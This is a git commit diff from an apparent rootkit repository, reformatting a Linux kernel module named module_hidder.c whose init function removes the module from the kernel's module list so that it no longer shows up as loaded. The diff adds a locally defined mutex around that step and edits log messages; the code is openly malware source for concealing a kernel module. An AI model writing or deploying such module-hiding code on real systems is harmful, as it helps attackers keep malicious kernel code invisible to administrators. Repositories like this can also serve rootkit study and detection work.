44f23db71c0263bc3abebaa0d7fcb843ffe3890c
xzhy324 <xzhy324@qq.com>
2023-03-21 14:23:28 +0800

    reformat module_hidder.c

--- rookits/module_hidder/module_hidder.c
+++ rookits/module_hidder/module_hidder.c
@@ -1,17 +1,21 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
+#include <linux/mutex.h>
 
+static DEFINE_MUTEX(module_mutex);
 
 static int __init rootkit_init(void)
 {
-    printk("module_hidder[conceal itselfs]: loaded");
+    printk("[module_hidder] loaded");
+    mutex_lock(&module_mutex);
     list_del_init(&THIS_MODULE->list);
+    mutex_unlock(&module_mutex);
     return 0;
 }
 
 static void __exit rootkit_exit(void)
 {
-    printk("module_hidder: exited");
+    printk("[module_hidder] exited");
 }
 
 module_init(rootkit_init);
